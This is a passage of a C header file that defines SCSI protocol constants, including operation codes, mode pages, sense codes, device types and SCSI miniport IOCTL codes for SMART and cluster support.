#define MODE_PAGE_WRITE_PARAMETERS      0x05
#define MODE_PAGE_VERIFY_ERROR          0x07
#define MODE_PAGE_CACHING               0x08
#define MODE_PAGE_PERIPHERAL            0x09
#define MODE_PAGE_CONTROL               0x0A
#define MODE_PAGE_MEDIUM_TYPES          0x0B
#define MODE_PAGE_NOTCH_PARTITION       0x0C
#define MODE_PAGE_CD_AUDIO_CONTROL      0x0E
#define MODE_PAGE_DATA_COMPRESS         0x0F
#define MODE_PAGE_DEVICE_CONFIG         0x10
#define MODE_PAGE_XOR_CONTROL           0x10
#define MODE_PAGE_MEDIUM_PARTITION      0x11
#define MODE_PAGE_ENCLOSURE_SERVICES_MANAGEMENT 0x14
#define MODE_PAGE_EXTENDED              0x15
#define MODE_PAGE_EXTENDED_DEVICE_SPECIFIC 0x16
#define MODE_PAGE_CDVD_FEATURE_SET      0x18
#define MODE_PAGE_PROTOCOL_SPECIFIC_LUN 0x18
#define MODE_PAGE_PROTOCOL_SPECIFIC_PORT 0x19
#define MODE_PAGE_POWER_CONDITION       0x1A
#define MODE_PAGE_LUN_MAPPING           0x1B
#define MODE_PAGE_FAULT_REPORTING       0x1C
#define MODE_PAGE_CDVD_INACTIVITY       0x1D
#define MODE_PAGE_ELEMENT_ADDRESS       0x1D
#define MODE_PAGE_TRANSPORT_GEOMETRY    0x1E
#define MODE_PAGE_DEVICE_CAPABILITIES   0x1F
#define MODE_PAGE_CAPABILITIES          0x2A

#define MODE_SENSE_RETURN_ALL           0x3f

#define MODE_SENSE_CURRENT_VALUES       0x00
#define MODE_SENSE_CHANGEABLE_VALUES    0x40
#define MODE_SENSE_DEFAULT_VAULES       0x80
#define MODE_SENSE_SAVED_VALUES         0xc0

/* SCSI CDB operation codes */
#define SCSIOP_TEST_UNIT_READY          0x00
#define SCSIOP_REZERO_UNIT              0x01
#define SCSIOP_REWIND                   0x01
#define SCSIOP_REQUEST_BLOCK_ADDR       0x02
#define SCSIOP_REQUEST_SENSE            0x03
#define SCSIOP_FORMAT_UNIT              0x04
#define SCSIOP_READ_BLOCK_LIMITS        0x05
#define SCSIOP_REASSIGN_BLOCKS          0x07
#define SCSIOP_INIT_ELEMENT_STATUS      0x07
#define SCSIOP_READ6                    0x08
#define SCSIOP_RECEIVE                  0x08
#define SCSIOP_WRITE6                   0x0A
#define SCSIOP_PRINT                    0x0A
#define SCSIOP_SEND                     0x0A
#define SCSIOP_SEEK6                    0x0B
#define SCSIOP_TRACK_SELECT             0x0B
#define SCSIOP_SLEW_PRINT               0x0B
#define SCSIOP_SET_CAPACITY             0x0B
#define SCSIOP_SEEK_BLOCK               0x0C
#define SCSIOP_PARTITION                0x0D
#define SCSIOP_READ_REVERSE             0x0F
#define SCSIOP_WRITE_FILEMARKS          0x10
#define SCSIOP_FLUSH_BUFFER             0x10
#define SCSIOP_SPACE                    0x11
#define SCSIOP_INQUIRY                  0x12
#define SCSIOP_VERIFY6                  0x13
#define SCSIOP_RECOVER_BUF_DATA         0x14
#define SCSIOP_MODE_SELECT              0x15
#define SCSIOP_RESERVE_UNIT             0x16
#define SCSIOP_RELEASE_UNIT             0x17
#define SCSIOP_COPY                     0x18
#define SCSIOP_ERASE                    0x19
#define SCSIOP_MODE_SENSE               0x1A
#define SCSIOP_START_STOP_UNIT          0x1B
#define SCSIOP_STOP_PRINT               0x1B
#define SCSIOP_LOAD_UNLOAD              0x1B
#define SCSIOP_RECEIVE_DIAGNOSTIC       0x1C
#define SCSIOP_SEND_DIAGNOSTIC          0x1D
#define SCSIOP_MEDIUM_REMOVAL           0x1E

#define SCSIOP_READ_FORMATTED_CAPACITY  0x23
#define SCSIOP_READ_CAPACITY            0x25
#define SCSIOP_READ                     0x28
#define SCSIOP_WRITE                    0x2A
#define SCSIOP_SEEK                     0x2B
#define SCSIOP_LOCATE                   0x2B
#define SCSIOP_POSITION_TO_ELEMENT      0x2B
#define SCSIOP_WRITE_VERIFY             0x2E
#define SCSIOP_VERIFY                   0x2F
#define SCSIOP_SEARCH_DATA_HIGH         0x30
#define SCSIOP_SEARCH_DATA_EQUAL        0x31
#define SCSIOP_SEARCH_DATA_LOW          0x32
#define SCSIOP_SET_LIMITS               0x33
#define SCSIOP_READ_POSITION            0x34
#define SCSIOP_SYNCHRONIZE_CACHE        0x35
#define SCSIOP_COMPARE                  0x39
#define SCSIOP_COPY_COMPARE             0x3A
#define SCSIOP_WRITE_DATA_BUFF          0x3B
#define SCSIOP_READ_DATA_BUFF           0x3C
#define SCSIOP_WRITE_LONG               0x3F
#define SCSIOP_CHANGE_DEFINITION        0x40
#define SCSIOP_WRITE_SAME               0x41
#define SCSIOP_READ_SUB_CHANNEL         0x42
#define SCSIOP_UNMAP                    0x42
#define SCSIOP_READ_TOC                 0x43
#define SCSIOP_READ_HEADER              0x44
#define SCSIOP_REPORT_DENSITY_SUPPORT   0x44
#define SCSIOP_PLAY_AUDIO               0x45
#define SCSIOP_GET_CONFIGURATION        0x46
#define SCSIOP_PLAY_AUDIO_MSF           0x47
#define SCSIOP_PLAY_TRACK_INDEX         0x48
#define SCSIOP_SANITIZE                 0x48
#define SCSIOP_PLAY_TRACK_RELATIVE      0x49
#define SCSIOP_GET_EVENT_STATUS         0x4A
#define SCSIOP_PAUSE_RESUME             0x4B
#define SCSIOP_LOG_SELECT               0x4C
#define SCSIOP_LOG_SENSE                0x4D
#define SCSIOP_STOP_PLAY_SCAN           0x4E
#define SCSIOP_XDWRITE                  0x50
#define SCSIOP_XPWRITE                  0x51
#define SCSIOP_READ_DISK_INFORMATION    0x51
#define SCSIOP_READ_DISC_INFORMATION    0x51
#define SCSIOP_READ_TRACK_INFORMATION   0x52
#define SCSIOP_XDWRITE_READ             0x53
#define SCSIOP_RESERVE_TRACK_RZONE      0x53
#define SCSIOP_SEND_OPC_INFORMATION     0x54
#define SCSIOP_MODE_SELECT10            0x55
#define SCSIOP_RESERVE_UNIT10           0x56
#define SCSIOP_RESERVE_ELEMENT          0x56
#define SCSIOP_RELEASE_UNIT10           0x57
#define SCSIOP_RELEASE_ELEMENT          0x57
#define SCSIOP_REPAIR_TRACK             0x58
#define SCSIOP_MODE_SENSE10             0x5A
#define SCSIOP_CLOSE_TRACK_SESSION      0x5B
#define SCSIOP_READ_BUFFER_CAPACITY     0x5C
#define SCSIOP_SEND_CUE_SHEET           0x5D
#define SCSIOP_PERSISTENT_RESERVE_IN    0x5E
#define SCSIOP_PERSISTENT_RESERVE_OUT   0x5F

#define SCSIOP_REPORT_LUNS              0xA0
#define SCSIOP_BLANK                    0xA1
#define SCSIOP_ATA_PASSTHROUGH12        0xA1
#define SCSIOP_SEND_EVENT               0xA2
#define SCSIOP_SECURITY_PROTOCOL_IN     0xA2
#define SCSIOP_SEND_KEY                 0xA3
#define SCSIOP_MAINTENANCE_IN           0xA3
#define SCSIOP_REPORT_KEY               0xA4
#define SCSIOP_MAINTENANCE_OUT          0xA4
#define SCSIOP_MOVE_MEDIUM              0xA5
#define SCSIOP_LOAD_UNLOAD_SLOT         0xA6
#define SCSIOP_EXCHANGE_MEDIUM          0xA6
#define SCSIOP_SET_READ_AHEAD           0xA7
#define SCSIOP_MOVE_MEDIUM_ATTACHED     0xA7
#define SCSIOP_READ12                   0xA8
#define SCSIOP_GET_MESSAGE              0xA8
#define SCSIOP_SERVICE_ACTION_OUT12     0xA9
#define SCSIOP_WRITE12                  0xAA
#define SCSIOP_SEND_MESSAGE             0xAB
#define SCSIOP_SERVICE_ACTION_IN12      0xAB
#define SCSIOP_GET_PERFORMANCE          0xAC
#define SCSIOP_READ_DVD_STRUCTURE       0xAD
#define SCSIOP_WRITE_VERIFY12           0xAE
#define SCSIOP_VERIFY12                 0xAF
#define SCSIOP_SEARCH_DATA_HIGH12       0xB0
#define SCSIOP_SEARCH_DATA_EQUAL12      0xB1
#define SCSIOP_SEARCH_DATA_LOW12        0xB2
#define SCSIOP_SET_LIMITS12             0xB3
#define SCSIOP_READ_ELEMENT_STATUS_ATTACHED 0xB4
#define SCSIOP_REQUEST_VOL_ELEMENT      0xB5
#define SCSIOP_SECURITY_PROTOCOL_OUT    0xB5
#define SCSIOP_SEND_VOLUME_TAG          0xB6
#define SCSIOP_SET_STREAMING            0xB6
#define SCSIOP_READ_DEFECT_DATA         0xB7
#define SCSIOP_READ_ELEMENT_STATUS      0xB8
#define SCSIOP_READ_CD_MSF              0xB9
#define SCSIOP_SCAN_CD                  0xBA
#define SCSIOP_REDUNDANCY_GROUP_IN      0xBA
#define SCSIOP_SET_CD_SPEED             0xBB
#define SCSIOP_REDUNDANCY_GROUP_OUT     0xBB
#define SCSIOP_PLAY_CD                  0xBC
#define SCSIOP_SPARE_IN                 0xBC
#define SCSIOP_MECHANISM_STATUS         0xBD
#define SCSIOP_SPARE_OUT                0xBD
#define SCSIOP_READ_CD                  0xBE
#define SCSIOP_VOLUME_SET_IN            0xBE
#define SCSIOP_SEND_DVD_STRUCTURE       0xBF
#define SCSIOP_VOLUME_SET_OUT           0xBF
#define SCSIOP_INIT_ELEMENT_RANGE       0xE7

#define SCSIOP_XDWRITE_EXTENDED16       0x80
#define SCSIOP_WRITE_FILEMARKS16        0x80
#define SCSIOP_REBUILD16                0x81
#define SCSIOP_READ_REVERSE16           0x81
#define SCSIOP_REGENERATE16             0x82
#define SCSIOP_EXTENDED_COPY            0x83
#define SCSIOP_POPULATE_TOKEN           0x83
#define SCSIOP_WRITE_USING_TOKEN        0x83
#define SCSIOP_RECEIVE_COPY_RESULTS     0x84
#define SCSIOP_RECEIVE_ROD_TOKEN_INFORMATION 0x84
#define SCSIOP_ATA_PASSTHROUGH16        0x85
#define SCSIOP_ACCESS_CONTROL_IN        0x86
#define SCSIOP_ACCESS_CONTROL_OUT       0x87
#define SCSIOP_READ16                   0x88
#define SCSIOP_COMPARE_AND_WRITE        0x89
#define SCSIOP_WRITE16                  0x8A
#define SCSIOP_READ_ATTRIBUTES          0x8C
#define SCSIOP_WRITE_ATTRIBUTES         0x8D
#define SCSIOP_WRITE_VERIFY16           0x8E
#define SCSIOP_VERIFY16                 0x8F
#define SCSIOP_PREFETCH16               0x90
#define SCSIOP_SYNCHRONIZE_CACHE16      0x91
#define SCSIOP_SPACE16                  0x91
#define SCSIOP_LOCK_UNLOCK_CACHE16      0x92
#define SCSIOP_LOCATE16                 0x92
#define SCSIOP_WRITE_SAME16             0x93
#define SCSIOP_ERASE16                  0x93
#define SCSIOP_ZBC_OUT                  0x94
#define SCSIOP_ZBC_IN                   0x95
#define SCSIOP_READ_DATA_BUFF16         0x9B
#define SCSIOP_READ_CAPACITY16          0x9E
#define SCSIOP_GET_LBA_STATUS           0x9E
#define SCSIOP_GET_PHYSICAL_ELEMENT_STATUS 0x9E
#define SCSIOP_REMOVE_ELEMENT_AND_TRUNCATE 0x9E
#define SCSIOP_SERVICE_ACTION_IN16      0x9E
#define SCSIOP_SERVICE_ACTION_OUT16     0x9F

#define SCSIOP_OPERATION32              0x7F

#define SERVICE_ACTION_OVERWRITE        0x01
#define SERVICE_ACTION_BLOCK_ERASE      0x02
#define SERVICE_ACTION_CRYPTO_ERASE     0x03
#define SERVICE_ACTION_EXIT_FAILURE     0x1f

#define SERVICE_ACTION_XDWRITE          0x0004
#define SERVICE_ACTION_XPWRITE          0x0006
#define SERVICE_ACTION_XDWRITEREAD      0x0007
#define SERVICE_ACTION_WRITE            0x000B
#define SERVICE_ACTION_WRITE_VERIFY     0x000C
#define SERVICE_ACTION_WRITE_SAME       0x000D
#define SERVICE_ACTION_ORWRITE          0x000E

#define SERVICE_ACTION_POPULATE_TOKEN     0x10
#define SERVICE_ACTION_WRITE_USING_TOKEN 0x11

#define SERVICE_ACTION_RECEIVE_TOKEN_INFORMATION 0x07

#define SERVICE_ACTION_CLOSE_ZONE           0x01
#define SERVICE_ACTION_FINISH_ZONE          0x02
#define SERVICE_ACTION_OPEN_ZONE            0x03
#define SERVICE_ACTION_RESET_WRITE_POINTER  0x04

#define SERVICE_ACTION_REPORT_ZONES         0x00

#define REPORT_ZONES_OPTION_LIST_ALL_ZONES               0x00
#define REPORT_ZONES_OPTION_LIST_EMPTY_ZONES             0x01
#define REPORT_ZONES_OPTION_LIST_IMPLICITLY_OPENED_ZONES 0x02
#define REPORT_ZONES_OPTION_LIST_EXPLICITLY_OPENED_ZONES 0x03
#define REPORT_ZONES_OPTION_LIST_CLOSED_ZONES            0x04
#define REPORT_ZONES_OPTION_LIST_FULL_ZONES              0x05
#define REPORT_ZONES_OPTION_LIST_READ_ONLY_ZONES         0x06
#define REPORT_ZONES_OPTION_LIST_OFFLINE_ZONES           0x07
#define REPORT_ZONES_OPTION_LIST_RWP_ZONES               0x10
#define REPORT_ZONES_OPTION_LIST_NON_SEQUENTIAL_WRITE_RESOURCES_ACTIVE_ZONES 0x11
#define REPORT_ZONES_OPTION_LIST_NOT_WRITE_POINTER_ZONES 0x3F

#define SERVICE_ACTION_READ_CAPACITY16              0x10
#define SERVICE_ACTION_GET_LBA_STATUS               0x12
#define SERVICE_ACTION_GET_PHYSICAL_ELEMENT_STATUS  0x17
#define SERVICE_ACTION_REMOVE_ELEMENT_AND_TRUNCATE  0x18
#define SERVICE_ACTION_REPORT_TIMESTAMP             0x0F
#define SERVICE_ACTION_SET_TIMESTAMP                0x0F

#define CDB_RETURN_ON_COMPLETION   0
#define CDB_RETURN_IMMEDIATE       1

#define CDB_FORCE_MEDIA_ACCESS 0x08

#define SCSIOP_DENON_EJECT_DISC    0xE6
#define SCSIOP_DENON_STOP_AUDIO    0xE7
#define SCSIOP_DENON_PLAY_AUDIO    0xE8
#define SCSIOP_DENON_READ_TOC      0xE9
#define SCSIOP_DENON_READ_SUBCODE  0xEB

#define SCSIMESS_ABORT                0x06
#define SCSIMESS_ABORT_WITH_TAG       0x0D
#define SCSIMESS_BUS_DEVICE_RESET     0X0C
#define SCSIMESS_CLEAR_QUEUE          0X0E
#define SCSIMESS_COMMAND_COMPLETE     0X00
#define SCSIMESS_DISCONNECT           0X04
#define SCSIMESS_EXTENDED_MESSAGE     0X01
#define SCSIMESS_IDENTIFY             0X80
#define SCSIMESS_IDENTIFY_WITH_DISCON 0XC0
#define SCSIMESS_IGNORE_WIDE_RESIDUE  0X23
#define SCSIMESS_INITIATE_RECOVERY    0X0F
#define SCSIMESS_INIT_DETECTED_ERROR  0X05
#define SCSIMESS_LINK_CMD_COMP        0X0A
#define SCSIMESS_LINK_CMD_COMP_W_FLAG 0X0B
#define SCSIMESS_MESS_PARITY_ERROR    0X09
#define SCSIMESS_MESSAGE_REJECT       0X07
#define SCSIMESS_NO_OPERATION         0X08
#define SCSIMESS_HEAD_OF_QUEUE_TAG    0X21
#define SCSIMESS_ORDERED_QUEUE_TAG    0X22
#define SCSIMESS_SIMPLE_QUEUE_TAG     0X20
#define SCSIMESS_RELEASE_RECOVERY     0X10
#define SCSIMESS_RESTORE_POINTERS     0X03
#define SCSIMESS_SAVE_DATA_POINTER    0X02
#define SCSIMESS_TERMINATE_IO_PROCESS 0X11

#define SCSIMESS_MODIFY_DATA_POINTER  0X00
#define SCSIMESS_SYNCHRONOUS_DATA_REQ 0X01
#define SCSIMESS_WIDE_DATA_REQUEST    0X03

#define SCSIMESS_MODIFY_DATA_LENGTH   5
#define SCSIMESS_SYNCH_DATA_LENGTH    3
#define SCSIMESS_WIDE_DATA_LENGTH     2

#define CDB_INQUIRY_EVPD           0x01

#define LUN0_FORMAT_SAVING_DEFECT_LIST 0
#define USE_DEFAULTMSB 0
#define USE_DEFAULTLSB 0

#define START_UNIT_CODE 0x01
#define STOP_UNIT_CODE 0x00

#define OFFSET_VER_DESCRIPTOR_ONE (FIELD_OFFSET(INQUIRYDATA, VersionDescriptors[0]))
#define OFFSET_VER_DESCRIPTOR_EIGHT (FIELD_OFFSET(INQUIRYDATA, VersionDescriptors[8]))

/* INQUIRYDATA.DeviceType constants */
#define DIRECT_ACCESS_DEVICE              0x00
#define SEQUENTIAL_ACCESS_DEVICE          0x01
#define PRINTER_DEVICE                    0x02
#define PROCESSOR_DEVICE                  0x03
#define WRITE_ONCE_READ_MULTIPLE_DEVICE   0x04
#define READ_ONLY_DIRECT_ACCESS_DEVICE    0x05
#define SCANNER_DEVICE                    0x06
#define OPTICAL_DEVICE                    0x07
#define MEDIUM_CHANGER                    0x08
#define COMMUNICATION_DEVICE              0x09
#define ARRAY_CONTROLLER_DEVICE           0x0C
#define SCSI_ENCLOSURE_DEVICE             0x0D
#define REDUCED_BLOCK_DEVICE              0x0E
#define OPTICAL_CARD_READER_WRITER_DEVICE 0x0F
#define BRIDGE_CONTROLLER_DEVICE          0x10
#define OBJECT_BASED_STORAGE_DEVICE       0x11
#define HOST_MANAGED_ZONED_BLOCK_DEVICE   0x14
#define UNKNOWN_OR_NO_DEVICE              0x1F
#define LOGICAL_UNIT_NOT_PRESENT_DEVICE   0x7F

#define DEVICE_QUALIFIER_ACTIVE           0x00
#define DEVICE_QUALIFIER_NOT_ACTIVE       0x01
#define DEVICE_QUALIFIER_NOT_SUPPORTED    0x03

/* INQUIRYDATA.DeviceTypeQualifier constants */
#define DEVICE_CONNECTED 0x00

#define SCSISTAT_GOOD                     0x00
#define SCSISTAT_CHECK_CONDITION          0x02
#define SCSISTAT_CONDITION_MET            0x04
#define SCSISTAT_BUSY                     0x08
#define SCSISTAT_INTERMEDIATE             0x10
#define SCSISTAT_INTERMEDIATE_COND_MET    0x14
#define SCSISTAT_RESERVATION_CONFLICT     0x18
#define SCSISTAT_COMMAND_TERMINATED       0x22
#define SCSISTAT_QUEUE_FULL               0x28

#define VPD_MAX_BUFFER_SIZE                 0xff

#define VPD_SUPPORTED_PAGES                 0x00
#define VPD_SERIAL_NUMBER                   0x80
#define VPD_DEVICE_IDENTIFIERS              0x83
#define VPD_MEDIA_SERIAL_NUMBER             0x84
#define VPD_SOFTWARE_INTERFACE_IDENTIFIERS  0x84
#define VPD_NETWORK_MANAGEMENT_ADDRESSES    0x85
#define VPD_EXTENDED_INQUIRY_DATA           0x86
#define VPD_MODE_PAGE_POLICY                0x87
#define VPD_SCSI_PORTS                      0x88

#define RESERVATION_ACTION_READ_KEYS                    0x00
#define RESERVATION_ACTION_READ_RESERVATIONS            0x01

#define RESERVATION_ACTION_REGISTER                     0x00
#define RESERVATION_ACTION_RESERVE                      0x01
#define RESERVATION_ACTION_RELEASE                      0x02
#define RESERVATION_ACTION_CLEAR                        0x03
#define RESERVATION_ACTION_PREEMPT                      0x04
#define RESERVATION_ACTION_PREEMPT_ABORT                0x05
#define RESERVATION_ACTION_REGISTER_IGNORE_EXISTING     0x06

#define RESERVATION_SCOPE_LU                            0x00
#define RESERVATION_SCOPE_ELEMENT                       0x02

#define RESERVATION_TYPE_WRITE_EXCLUSIVE                0x01
#define RESERVATION_TYPE_EXCLUSIVE                      0x03
#define RESERVATION_TYPE_WRITE_EXCLUSIVE_REGISTRANTS    0x05
#define RESERVATION_TYPE_EXCLUSIVE_REGISTRANTS          0x06

#define SENSE_BUFFER_SIZE              18

#define MAX_SENSE_BUFFER_SIZE          255

#define MAX_ADDITIONAL_SENSE_BYTES (MAX_SENSE_BUFFER_SIZE - SENSE_BUFFER_SIZE)

/* Sense codes */
#define SCSI_SENSE_NO_SENSE               0x00
#define SCSI_SENSE_RECOVERED_ERROR        0x01
#define SCSI_SENSE_NOT_READY              0x02
#define SCSI_SENSE_MEDIUM_ERROR           0x03
#define SCSI_SENSE_HARDWARE_ERROR         0x04
#define SCSI_SENSE_ILLEGAL_REQUEST        0x05
#define SCSI_SENSE_UNIT_ATTENTION         0x06
#define SCSI_SENSE_DATA_PROTECT           0x07
#define SCSI_SENSE_BLANK_CHECK            0x08
#define SCSI_SENSE_UNIQUE                 0x09
#define SCSI_SENSE_COPY_ABORTED           0x0A
#define SCSI_SENSE_ABORTED_COMMAND        0x0B
#define SCSI_SENSE_EQUAL                  0x0C
#define SCSI_SENSE_VOL_OVERFLOW           0x0D
#define SCSI_SENSE_MISCOMPARE             0x0E
#define SCSI_SENSE_RESERVED               0x0F

/* Additional tape bit */
#define SCSI_ILLEGAL_LENGTH               0x20
#define SCSI_EOM                          0x40
#define SCSI_FILE_MARK                    0x80

/* Additional Sense codes */
#define SCSI_ADSENSE_NO_SENSE                              0x00
#define SCSI_ADSENSE_NO_SEEK_COMPLETE                      0x02
#define SCSI_ADSENSE_LUN_NOT_READY                         0x04
#define SCSI_ADSENSE_LUN_COMMUNICATION                     0x08
#define SCSI_ADSENSE_WRITE_ERROR                           0x0C
#define SCSI_ADSENSE_TRACK_ERROR                           0x14
#define SCSI_ADSENSE_SEEK_ERROR                            0x15
#define SCSI_ADSENSE_REC_DATA_NOECC                        0x17
#define SCSI_ADSENSE_REC_DATA_ECC                          0x18
#define SCSI_ADSENSE_PARAMETER_LIST_LENGTH                 0x1A
#define SCSI_ADSENSE_ILLEGAL_COMMAND                       0x20
#define SCSI_ADSENSE_ILLEGAL_BLOCK                         0x21
#define SCSI_ADSENSE_INVALID_CDB                           0x24
#define SCSI_ADSENSE_INVALID_LUN                           0x25
#define SCSI_ADSENSE_INVALID_FIELD_PARAMETER_LIST          0x26
#define SCSI_ADSENSE_WRITE_PROTECT                         0x27
#define SCSI_ADSENSE_MEDIUM_CHANGED                        0x28
#define SCSI_ADSENSE_BUS_RESET                             0x29
#define SCSI_ADSENSE_PARAMETERS_CHANGED                    0x2A
#define SCSI_ADSENSE_INSUFFICIENT_TIME_FOR_OPERATION       0x2E
#define SCSI_ADSENSE_INVALID_MEDIA                         0x30
#define SCSI_ADSENSE_NO_MEDIA_IN_DEVICE                    0x3a
#define SCSI_ADSENSE_POSITION_ERROR                        0x3b
#define SCSI_ADSENSE_OPERATING_CONDITIONS_CHANGED          0x3f
#define SCSI_ADSENSE_OPERATOR_REQUEST                      0x5a
#define SCSI_ADSENSE_FAILURE_PREDICTION_THRESHOLD_EXCEEDED 0x5d
#define SCSI_ADSENSE_ILLEGAL_MODE_FOR_THIS_TRACK           0x64
#define SCSI_ADSENSE_COPY_PROTECTION_FAILURE               0x6f
#define SCSI_ADSENSE_POWER_CALIBRATION_ERROR               0x73
#define SCSI_ADSENSE_VENDOR_UNIQUE                         0x80
#define SCSI_ADSENSE_MUSIC_AREA                            0xA0
#define SCSI_ADSENSE_DATA_AREA                             0xA1
#define SCSI_ADSENSE_VOLUME_OVERFLOW                       0xA7

#define SCSI_ADWRITE_PROTECT                        SCSI_ADSENSE_WRITE_PROTECT
#define SCSI_FAILURE_PREDICTION_THRESHOLD_EXCEEDED  SCSI_ADSENSE_FAILURE_PREDICTION_THRESHOLD_EXCEEDED

#define SCSI_SENSEQ_CAUSE_NOT_REPORTABLE                   0x00
#define SCSI_SENSEQ_BECOMING_READY                         0x01
#define SCSI_SENSEQ_INIT_COMMAND_REQUIRED                  0x02
#define SCSI_SENSEQ_MANUAL_INTERVENTION_REQUIRED           0x03
#define SCSI_SENSEQ_FORMAT_IN_PROGRESS                     0x04
#define SCSI_SENSEQ_REBUILD_IN_PROGRESS                    0x05
#define SCSI_SENSEQ_RECALCULATION_IN_PROGRESS              0x06
#define SCSI_SENSEQ_OPERATION_IN_PROGRESS                  0x07
#define SCSI_SENSEQ_LONG_WRITE_IN_PROGRESS                 0x08
#define SCSI_SENSEQ_LOSS_OF_STREAMING                      0x09
#define SCSI_SENSEQ_PADDING_BLOCKS_ADDED                   0x0A

#define SCSI_SENSEQ_COMM_FAILURE                 0x00
#define SCSI_SENSEQ_COMM_TIMEOUT                 0x01
#define SCSI_SENSEQ_COMM_PARITY_ERROR            0x02
#define SCSI_SESNEQ_COMM_CRC_ERROR               0x03
#define SCSI_SENSEQ_UNREACHABLE_TARGET           0x04

#define SCSI_SENSEQ_FILEMARK_DETECTED 0x01
#define SCSI_SENSEQ_END_OF_MEDIA_DETECTED 0x02
#define SCSI_SENSEQ_SETMARK_DETECTED 0x03
#define SCSI_SENSEQ_BEGINNING_OF_MEDIA_DETECTED 0x04

#define SCSI_SENSEQ_ILLEGAL_ELEMENT_ADDR 0x01

#define SCSI_SENSEQ_DESTINATION_FULL 0x0d
#define SCSI_SENSEQ_SOURCE_EMPTY     0x0e

#define SCSI_SENSEQ_INCOMPATIBLE_MEDIA_INSTALLED 0x00
#define SCSI_SENSEQ_UNKNOWN_FORMAT 0x01
#define SCSI_SENSEQ_INCOMPATIBLE_FORMAT 0x02
#define SCSI_SENSEQ_CLEANING_CARTRIDGE_INSTALLED 0x03

#define SCSI_SENSEQ_TARGET_OPERATING_CONDITIONS_CHANGED 0x00
#define SCSI_SENSEQ_MICROCODE_CHANGED                   0x01
#define SCSI_SENSEQ_OPERATING_DEFINITION_CHANGED        0x02
#define SCSI_SENSEQ_INQUIRY_DATA_CHANGED                0x03
#define SCSI_SENSEQ_COMPONENT_DEVICE_ATTACHED           0x04
#define SCSI_SENSEQ_DEVICE_IDENTIFIER_CHANGED           0x05
#define SCSI_SENSEQ_REDUNDANCY_GROUP_MODIFIED           0x06
#define SCSI_SENSEQ_REDUNDANCY_GROUP_DELETED            0x07
#define SCSI_SENSEQ_SPARE_MODIFIED                      0x08
#define SCSI_SENSEQ_SPARE_DELETED                       0x09
#define SCSI_SENSEQ_VOLUME_SET_MODIFIED                 0x0A
#define SCSI_SENSEQ_VOLUME_SET_DELETED                  0x0B
#define SCSI_SENSEQ_VOLUME_SET_DEASSIGNED               0x0C
#define SCSI_SENSEQ_VOLUME_SET_REASSIGNED               0x0D
#define SCSI_SENSEQ_REPORTED_LUNS_DATA_CHANGED          0x0E
#define SCSI_SENSEQ_ECHO_BUFFER_OVERWRITTEN             0x0F
#define SCSI_SENSEQ_MEDIUM_LOADABLE                     0x10
#define SCSI_SENSEQ_MEDIUM_AUXILIARY_MEMORY_ACCESSIBLE  0x11

#define SCSI_SENSEQ_STATE_CHANGE_INPUT     0x00
#define SCSI_SENSEQ_MEDIUM_REMOVAL         0x01
#define SCSI_SENSEQ_WRITE_PROTECT_ENABLE   0x02
#define SCSI_SENSEQ_WRITE_PROTECT_DISABLE  0x03

#define SCSI_SENSEQ_AUTHENTICATION_FAILURE                          0x00
#define SCSI_SENSEQ_KEY_NOT_PRESENT                                 0x01
#define SCSI_SENSEQ_KEY_NOT_ESTABLISHED                             0x02
#define SCSI_SENSEQ_READ_OF_SCRAMBLED_SECTOR_WITHOUT_AUTHENTICATION 0x03
#define SCSI_SENSEQ_MEDIA_CODE_MISMATCHED_TO_LOGICAL_UNIT           0x04
#define SCSI_SENSEQ_LOGICAL_UNIT_RESET_COUNT_ERROR                  0x05

#define SCSI_SENSEQ_POWER_CALIBRATION_AREA_ALMOST_FULL 0x01
#define SCSI_SENSEQ_POWER_CALIBRATION_AREA_FULL        0x02
#define SCSI_SENSEQ_POWER_CALIBRATION_AREA_ERROR       0x03
#define SCSI_SENSEQ_PMA_RMA_UPDATE_FAILURE             0x04
#define SCSI_SENSEQ_PMA_RMA_IS_FULL                    0x05
#define SCSI_SENSEQ_PMA_RMA_ALMOST_FULL                0x06

#define FILE_DEVICE_SCSI 0x0000001b

#define IOCTL_SCSI_EXECUTE_IN ((FILE_DEVICE_SCSI << 16) + 0x0011)
#define IOCTL_SCSI_EXECUTE_OUT ((FILE_DEVICE_SCSI << 16) + 0x0012)
#define IOCTL_SCSI_EXECUTE_NONE ((FILE_DEVICE_SCSI << 16) + 0x0013)

/* SMART support in ATAPI */
#define IOCTL_SCSI_MINIPORT_SMART_VERSION               ((FILE_DEVICE_SCSI << 16) + 0x0500)
#define IOCTL_SCSI_MINIPORT_IDENTIFY                    ((FILE_DEVICE_SCSI << 16) + 0x0501)
#define IOCTL_SCSI_MINIPORT_READ_SMART_ATTRIBS          ((FILE_DEVICE_SCSI << 16) + 0x0502)
#define IOCTL_SCSI_MINIPORT_READ_SMART_THRESHOLDS       ((FILE_DEVICE_SCSI << 16) + 0x0503)
#define IOCTL_SCSI_MINIPORT_ENABLE_SMART                ((FILE_DEVICE_SCSI << 16) + 0x0504)
#define IOCTL_SCSI_MINIPORT_DISABLE_SMART               ((FILE_DEVICE_SCSI << 16) + 0x0505)
#define IOCTL_SCSI_MINIPORT_RETURN_STATUS               ((FILE_DEVICE_SCSI << 16) + 0x0506)
#define IOCTL_SCSI_MINIPORT_ENABLE_DISABLE_AUTOSAVE     ((FILE_DEVICE_SCSI << 16) + 0x0507)
#define IOCTL_SCSI_MINIPORT_SAVE_ATTRIBUTE_VALUES       ((FILE_DEVICE_SCSI << 16) + 0x0508)
#define IOCTL_SCSI_MINIPORT_EXECUTE_OFFLINE_DIAGS       ((FILE_DEVICE_SCSI << 16) + 0x0509)
#define IOCTL_SCSI_MINIPORT_ENABLE_DISABLE_AUTO_OFFLINE ((FILE_DEVICE_SCSI << 16) + 0x050a)
#define IOCTL_SCSI_MINIPORT_READ_SMART_LOG              ((FILE_DEVICE_SCSI << 16) + 0x050b)
#define IOCTL_SCSI_MINIPORT_WRITE_SMART_LOG             ((FILE_DEVICE_SCSI << 16) + 0x050c)

/* CLUSTER support */
#define IOCTL_SCSI_MINIPORT_NOT_QUORUM_CAPABLE ((FILE_DEVICE_SCSI << 16) + 0x0520)
#define IOCTL_SCSI_MINIPORT_NOT_CLUSTER_CAPABLE ((FILE_DEVICE_SCSI << 16) + 0x0521)

#define MODE_FD_SINGLE_SIDE               0x01
#define MODE_FD_DOUBLE_SIDE               0x02
#define MODE_FD_MAXIMUM_TYPE              0x1E
#define MODE_DSP_FUA_SUPPORTED            0x10
#define MODE_DSP_WRITE_PROTECT            0x80

#define CDDA_CHANNEL_MUTED      0x0
#define CDDA_CHANNEL_ZERO       0x1
#define CDDA_CHANNEL_ONE        0x2
#define CDDA_CHANNEL_TWO        0x4
